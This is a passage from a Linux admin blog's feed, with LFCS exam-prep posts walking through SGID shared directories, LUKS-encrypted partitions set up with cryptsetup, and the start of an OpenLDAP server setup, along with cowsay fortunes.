</span><span class='line'>| Consider changing name and moving to a |
</span><span class='line'>\ new town.                              /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Configuring SGID directories]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/13/lfcs-prep-configuring-sgid-directories/"/>
    <updated>2018-02-13T12:39:42-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/13/lfcs-prep-configuring-sgid-directories</id>
    <content type="html"><![CDATA[<p>In this post we&rsquo;ll see how to configure SGID directories to share files between members of the same group.</p>

<!-- more -->


<p>I created a group called saiyans with a GID of 9000 to separate it from the rest of the groups:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>groupadd -g 9000 saiyans</span></code></pre></td></tr></table></div></figure>


<p>I made a directory that will be used to share files within the group:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /opt/invasion_plans</span></code></pre></td></tr></table></div></figure>


<p>Changed the ownership of the directory to the nobody user and the saiyans group.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chown nobody:saiyans /opt/invasion_plans/
</span><span class='line'>ls -ld /opt/invasion_plans/
</span><span class='line'>drwxr-xr-x. 2 nobody saiyans 6 Feb 13 12:57 /opt/invasion_plans/</span></code></pre></td></tr></table></div></figure>


<p>Set Group ID:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chmod g+s /opt/invasion_plans/
</span><span class='line'>ls -ld /opt/invasion_plans/
</span><span class='line'>drwxr-sr-x. 2 nobody saiyans 6 Feb 13 12:57 /opt/invasion_plans/</span></code></pre></td></tr></table></div></figure>


<p>There are no write permissions yet, so have to assign them:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chmod g+w /opt/invasion_plans/
</span><span class='line'>ls -ld /opt/invasion_plans/
</span><span class='line'>drwxrwsr-x. 2 nobody saiyans 6 Feb 13 12:57 /opt/invasion_plans/</span></code></pre></td></tr></table></div></figure>


<p>Removed the permissions for the other users:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chmod o-rwx /opt/invasion_plans/
</span><span class='line'>ls -ld /opt/invasion_plans/
</span><span class='line'>drwxrws---. 2 nobody saiyans 6 Feb 13 12:57 /opt/invasion_plans/</span></code></pre></td></tr></table></div></figure>


<p>Now I added 2 users to the saiyans group:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>useradd -G saiyans kakarot 
</span><span class='line'>useradd -G saiyans vegeta
</span><span class='line'>cat /etc/group | grep saiyans
</span><span class='line'>saiyans:x:9000:kakarot,vegeta</span></code></pre></td></tr></table></div></figure>


<p>And tested it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>su - kakarot
</span><span class='line'>echo kamehameha &gt; /opt/invasion_plans/boom
</span><span class='line'>su - vegeta
</span><span class='line'>echo 'final flash' &gt; /opt/invasion_plans/bang
</span><span class='line'>[kakarot@rhel7 ~]$ cat /opt/invasion_plans/bang 
</span><span class='line'>final flash
</span><span class='line'>[vegeta@rhel7 ~]$ cat /opt/invasion_plans/boom 
</span><span class='line'>kamehameha</span></code></pre></td></tr></table></div></figure>


<p>In case users need to be restricted from deleting files they didn&rsquo;t create, you can set the sticky bit with <code>chmod +t /opt/invasion_plans</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Your lucky number is 3552664958674928. \
</span><span class='line'>\ Watch for it everywhere.               /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Managing encrypted partitions]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/12/lfcs-prep-managing-encrypted-partitions/"/>
    <updated>2018-02-12T12:39:28-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/12/lfcs-prep-managing-encrypted-partitions</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll go over creating LUKS-encrypted partitions with <strong>cryptsetup</strong>. LUKS (Linux Unified Key Setup) is a block device encryption format that is the standard on Linux systems. Also, because it stores all the necessary data in the partition header, it&rsquo;s easy to migrate partitions.</p>

<!-- more -->


<p>To get an overview of all the cryptographic ciphers that the system can use, look in <code>/proc/crypto</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> cat /proc/crypto | grep name
</span><span class='line'>name         : crc32
</span><span class='line'>name         : __ghash
</span><span class='line'>name         : ghash
</span><span class='line'>name         : __ghash
</span><span class='line'>name         : xts(aes)
</span><span class='line'>name         : lrw(aes)
</span><span class='line'>name         : __xts-aes-aesni
</span><span class='line'>name         : __lrw-aes-aesni
</span><span class='line'>name         : pcbc(aes)
</span><span class='line'>name         : rfc4106(gcm(aes))
</span><span class='line'>name         : __gcm-aes-aesni
</span><span class='line'>name         : ctr(aes)
</span><span class='line'>name         : __ctr-aes-aesni
</span><span class='line'>name         : cbc(aes)
</span><span class='line'>name         : __ecb-aes-aesni
</span><span class='line'>name         : ecb(aes)
</span><span class='line'>name         : __cbc-aes-aesni
</span><span class='line'>name         : __ecb-aes-aesni
</span><span class='line'>name         : __aes-aesni
</span><span class='line'>name         : aes
</span><span class='line'>name         : crct10dif
</span><span class='line'>name         : crct10dif
</span><span class='line'>name         : crc32c
</span><span class='line'>name         : hmac(sha256)
</span><span class='line'>name         : hmac(sha1)
</span><span class='line'>name         : lzo
</span><span class='line'>name         : crc32c
</span><span class='line'>name         : aes
</span><span class='line'>name         : sha224
</span><span class='line'>name         : sha256
</span><span class='line'>name         : sha1
</span><span class='line'>name         : md5
</span><span class='line'>name         : sha224
</span><span class='line'>name         : sha256
</span><span class='line'>name         : sha1
</span><span class='line'>name         : aes</span></code></pre></td></tr></table></div></figure>


<p>For this demo, I will be using a 200MB partition called /dev/sdb1. The below command initializes the partition as a LUKS device and you have to configure a passphrase at this step.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup luksFormat /dev/sdb1
</span><span class='line'>
</span><span class='line'>WARNING!
</span><span class='line'>========
</span><span class='line'>This will overwrite data on /dev/sdb1 irrevocably.
</span><span class='line'>
</span><span class='line'>Are you sure? (Type uppercase yes): YES
</span><span class='line'>Enter passphrase: 
</span><span class='line'>Verify passphrase: </span></code></pre></td></tr></table></div></figure>


<p>You can check out the header:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup luksDump /dev/sdb1
</span><span class='line'>LUKS header information for /dev/sdb1
</span><span class='line'>
</span><span class='line'>Version:           1
</span><span class='line'>Cipher name:       aes
</span><span class='line'>Cipher mode:       xts-plain64
</span><span class='line'>Hash spec:         sha256
</span><span class='line'>Payload offset:    4096
</span><span class='line'>MK bits:           256
</span><span class='line'>MK digest:         6b 5e c2 bb 77 f9 0a 0d d4 67 4d 6f 01 a1 df 33 ce d7 94 b2 
</span><span class='line'>MK salt:           42 9d d7 5f 3b 6c c1 0b 55 53 d1 fd 28 bd 73 27 
</span><span class='line'>                   64 63 bb 70 02 de 33 46 0c 4f 2e 07 a9 a7 28 52 
</span><span class='line'>MK iterations:     68500
</span><span class='line'>UUID:              85b6a404-b24e-4c31-baf3-75cb3f041054
</span><span class='line'>
</span><span class='line'>Key Slot 0: ENABLED
</span><span class='line'>    Iterations:             547007
</span><span class='line'>    Salt:                   4d 13 8b 20 74 cb 88 dd 8e dc b3 b0 2c ca 83 4b 
</span><span class='line'>                              bd ab 12 2d 95 57 72 06 00 25 11 0e 43 b8 dc 81 
</span><span class='line'>    Key material offset:    8
</span><span class='line'>    AF stripes:                4000
</span><span class='line'>Key Slot 1: DISABLED
</span><span class='line'>Key Slot 2: DISABLED
</span><span class='line'>Key Slot 3: DISABLED
</span><span class='line'>Key Slot 4: DISABLED
</span><span class='line'>Key Slot 5: DISABLED
</span><span class='line'>Key Slot 6: DISABLED
</span><span class='line'>Key Slot 7: DISABLED</span></code></pre></td></tr></table></div></figure>


<p>Next, create a mapping between the opened LUKS partition and the device mapper.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup --verbose luksOpen /dev/sdb1 hidden
</span><span class='line'>Enter passphrase for /dev/sdb1: 
</span><span class='line'>Key slot 0 unlocked.
</span><span class='line'>Command successful.</span></code></pre></td></tr></table></div></figure>


<p>View the mapping details:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l /dev/mapper/hidden 
</span><span class='line'>lrwxrwxrwx. 1 root root 7 Feb  9 18:29 /dev/mapper/hidden -&gt; ../dm-2</span></code></pre></td></tr></table></div></figure>


<p>If you want to have more insight into the status of the mapping:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup -v status hidden
</span><span class='line'>/dev/mapper/hidden is active.
</span><span class='line'>  type:    LUKS1
</span><span class='line'>  cipher:  aes-xts-plain64
</span><span class='line'>  keysize: 256 bits
</span><span class='line'>  device:  /dev/sdb1
</span><span class='line'>  offset:  4096 sectors
</span><span class='line'>  size:    405504 sectors
</span><span class='line'>  mode:    read/write
</span><span class='line'>Command successful.</span></code></pre></td></tr></table></div></figure>


<p>Format the partition with the filesystem of your choice:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkfs -t ext4 /dev/mapper/hidden
</span><span class='line'>mke2fs 1.42.9 (28-Dec-2013)
</span><span class='line'>Filesystem label=
</span><span class='line'>OS type: Linux
</span><span class='line'>Block size=1024 (log=0)
</span><span class='line'>Fragment size=1024 (log=0)
</span><span class='line'>Stride=0 blocks, Stripe width=0 blocks
</span><span class='line'>50800 inodes, 202752 blocks
</span><span class='line'>10137 blocks (5.00%) reserved for the super user
</span><span class='line'>First data block=1
</span><span class='line'>Maximum filesystem blocks=33816576
</span><span class='line'>25 block groups
</span><span class='line'>8192 blocks per group, 8192 fragments per group
</span><span class='line'>2032 inodes per group
</span><span class='line'>Superblock backups stored on blocks: 
</span><span class='line'>    8193, 24577, 40961, 57345, 73729
</span><span class='line'>
</span><span class='line'>Allocating group tables: done                            
</span><span class='line'>Writing inode tables: done                            
</span><span class='line'>Creating journal (4096 blocks): done
</span><span class='line'>Writing superblocks and filesystem accounting information: done </span></code></pre></td></tr></table></div></figure>


<p>I made a folder for mounting the new encrypted partition and mounted it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -v /dev/mapper/hidden /mnt/hidden
</span><span class='line'>mount: /mnt/hidden does not contain SELinux labels.
</span><span class='line'>       You just mounted an file system that supports labels which does not
</span><span class='line'>       contain labels, onto an SELinux box. It is likely that confined
</span><span class='line'>       applications will generate AVC messages and not be allowed access to
</span><span class='line'>       this file system.  For more details see restorecon(8) and mount(8).
</span><span class='line'>mount: /dev/mapper/hidden mounted on /mnt/hidden.</span></code></pre></td></tr></table></div></figure>


<p>When done working on it, you can unmount it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>umount -v /mnt/hidden
</span><span class='line'>umount: /mnt/hidden (/dev/mapper/hidden) unmounted</span></code></pre></td></tr></table></div></figure>


<p>And then remove the mapping:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup --verbose luksClose hidden
</span><span class='line'>Command successful.</span></code></pre></td></tr></table></div></figure>


<p>To remount it, just go through the above steps again. If you want to mount it at boot, you need to take note of some UUIDS:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lsblk -o name,uuid,mountpoint
</span><span class='line'>NAME          UUID                                   MOUNTPOINT
</span><span class='line'>sda                                                  
</span><span class='line'>├─sda1        b8e2fb99-bf4c-4632-883b-8ed5c2350b1e   /boot
</span><span class='line'>└─sda2        PLxZXl-aHBf-9VPQ-XOd1-eLMH-cWOW-NhjdcP 
</span><span class='line'>  ├─rhel-root 2c0268ac-c31a-462d-b5b9-41bdfbecd75d   /
</span><span class='line'>  └─rhel-swap 6544d880-b634-4566-a68d-d3a58cec4cf6   [SWAP]
</span><span class='line'>sdb                                                  
</span><span class='line'>└─sdb1        85b6a404-b24e-4c31-baf3-75cb3f041054   
</span><span class='line'>  └─hidden    ab98b274-9d34-41f0-9178-4f8c4b7e8a77   
</span><span class='line'>sr0                                                  </span></code></pre></td></tr></table></div></figure>


<p>Then you need to edit <code>/etc/crypttab</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>name device &lt;password&gt; &lt;options&gt;</span></code></pre></td></tr></table></div></figure>


<p>Device refers to the block device or its UUID. The entries between tags are optional. In my case, the entry would look like this (the UUID is of /dev/sdb1)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/crypttab 
</span><span class='line'>hidden UUID=85b6a404-b24e-4c31-baf3-75cb3f041054</span></code></pre></td></tr></table></div></figure>


<p>And edit /etc/fstab like you would for any other partition (UUID refers to the hidden mapping):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>UUID=ab98b274-9d34-41f0-9178-4f8c4b7e8a77 /mnt/hidden ext4 defaults 0 0</span></code></pre></td></tr></table></div></figure>


<p>Now you will be prompted at boot for the password. If you want to use a key for automatic unlocking, create a key file (here a random key of 4096 bytes length):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dd if=/dev/urandom of=/root/key bs=1024 count=4 
</span><span class='line'>4+0 records in
</span><span class='line'>4+0 records out
</span><span class='line'>4096 bytes (4.1 kB) copied, 0.00100253 s, 4.1 MB/s</span></code></pre></td></tr></table></div></figure>


<p>Make it only readable by root with <code>chmod 400 /root/key</code></p>

<p>Add the key for the encrypted volume:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup -v luksAddKey /dev/sdb1 /root/key
</span><span class='line'>Enter any existing passphrase: 
</span><span class='line'>Key slot 0 unlocked.
</span><span class='line'>Key slot 0 unlocked.
</span><span class='line'>Command successful.</span></code></pre></td></tr></table></div></figure>


<p>And add the path of the key file to /etc/crypttab</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/crypttab 
</span><span class='line'>hidden UUID=85b6a404-b24e-4c31-baf3-75cb3f041054 /root/key</span></code></pre></td></tr></table></div></figure>


<p>Now the volume will be unlocked automatically without the need of entering a passphrase.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ You definitely intend to start living \
</span><span class='line'>\ sometime soon.                        /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - LDAP server and client configuration]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/11/lfcs-prep-ldap-server-and-client-configuration/"/>
    <updated>2018-02-11T10:37:49-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/11/lfcs-prep-ldap-server-and-client-configuration</id>
    <content type="html"><![CDATA[<p>Something that you may come up with in the exam and that I&rsquo;ve been avoiding is the LDAP topic. In this post we&rsquo;ll look at server and client configuration for LDAP.</p>

<p>For this scenario, the hostname of my LDAP server is centos.example.com. The domain is example.com and the entry is inside /etc/hosts</p>

<p>I used <a href="https://www.certdepot.net/rhel7-configure-ldap-directory-service-user-connection/">CertDepot</a> as inspiration..the LDAP syntax and topic really keeps me away from approaching it.</p>

<!-- more -->


<h2>Server configuration</h2>

<p>To get started, install these packages:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum install -y openldap openldap-clients openldap-servers migrationtools</span></code></pre></td></tr></table></div></figure>


<p>Some info about them:</p>

<ul>
<li><p>openldap is the open source implementation of LDAP</p></li>
<li><p>openldap-clients contains LDAP client utilities</p></li>
<li><p>openldap-servers is the server package</p></li>
<li><p>The MigrationTools are a set of Perl scripts for migrating users, groups, aliases, hosts, netgroups, networks, protocols, RPCs, and services from existing nameservices (flat files, NIS, and NetInfo) to LDAP.</p></li>
</ul>


<p>Create LDAP password from a key, (the string secret below):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>slappasswd -s secret -n &gt; /etc/openldap/passwd</span></code></pre></td></tr></table></div></figure>


<p>Inside the file take note of the generated password: <code>{SSHA}T4srVIBK+rJ9DXlVG7dvZnnAQhAZuO07</code></p>

<p>Generate an X509 certificate valid for 1 year (note the paths of the certificate and private key):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>openssl req -new -x509 -nodes -out /etc/openldap/certs/cert.pem -keyout /etc/openldap/certs/key.pem -days 365</span></code></pre></td></tr></table></div></figure>


<p>At the prompt, you can leave as blank the values except the below, where you put your server&rsquo;s hostname:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Common Name (eg, your name or your server's hostname) []:centos.example.com</span></code></pre></td></tr></table></div></figure>


<p>Change the ownership of the files inside <code>/etc/openldap/certs</code> and change the permissions of the private key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd /etc/openldap/certs
</span><span class='line'>chown ldap:ldap *
</span><span class='line'>chmod 600 key.pem 
</span><span class='line'>ll
</span><span class='line'>total 88
</span><span class='line'>-rw-r--r--. 1 ldap ldap 65536 Feb 11 14:08 cert8.db
</span><span class='line'>-rw-r--r--. 1 ldap ldap  1298 Feb 11 14:27 cert.pem
</span><span class='line'>-rw-r--r--. 1 ldap ldap 16384 Feb 11 14:08 key3.db
</span><span class='line'>-rw-------. 1 ldap ldap  1704 Feb 11 14:27 key.pem
</span><span class='line'>-r--r-----. 1 ldap ldap    45 Apr 26  2016 password
</span><span class='line'>-rw-r--r--. 1 ldap ldap 16384 Apr 26  2016 secmod.db</span></code></pre></td></tr></table></div></figure>


<p>Copy the LDAP database:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG</span></code></pre></td></tr></table></div></figure>


<p>Check the slapd configuration (below errors are safe):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>slaptest
</span><span class='line'>5a8038c4 hdb_db_open: database "dc=my-domain,dc=com": db_open(/var/lib/ldap/id2entry.bdb) failed: No such file or directory (2).
</span><span class='line'>5a8038c4 backend_startup_one (type=hdb, suffix="dc=my-domain,dc=com"): bi_db_open failed! (2)
</span><span class='line'>slap_startup failed (test would succeed using the -u switch)</span></code></pre></td></tr></table></div></figure>


<p>Change the ownership of the DB to ldap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chown ldap:ldap /var/lib/ldap/*</span></code></pre></td></tr></table></div></figure>


<p>Now start the service</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl start slapd</span></code></pre></td></tr></table></div></figure>


<p>Check that the LDAP service is listening:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -lpt | grep ldap
</span><span class='line'>tcp        0      0 0.0.0.0:ldap            0.0.0.0:*               LISTEN      5558/slapd          
</span><span class='line'>tcp6       0      0 [::]:ldap               [::]:*                  LISTEN      5558/slapd    </span></code></pre></td></tr></table></div></figure>


<p>Next you have to add some LDAP schemas</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd /etc/openldap/schema</span></code></pre></td></tr></table></div></figure>


<p>Mainly, add the following:</p>

<ul>
<li>cosine (Cosine and Internet X.500)</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapadd -Y EXTERNAL -H ldapi:/// -D "cn=config" -f cosine.ldif
</span><span class='line'>SASL/EXTERNAL authentication started
</span><span class='line'>SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
</span><span class='line'>SASL SSF: 0
</span><span class='line'>adding new entry "cn=cosine,cn=schema,cn=config"</span></code></pre></td></tr></table></div></figure>


<ul>
<li>nis (Network Information Services)</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapadd -Y EXTERNAL -H ldapi:/// -D "cn=config" -f nis.ldif
</span><span class='line'>SASL/EXTERNAL authentication started
</span><span class='line'>SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
</span><span class='line'>SASL SSF: 0
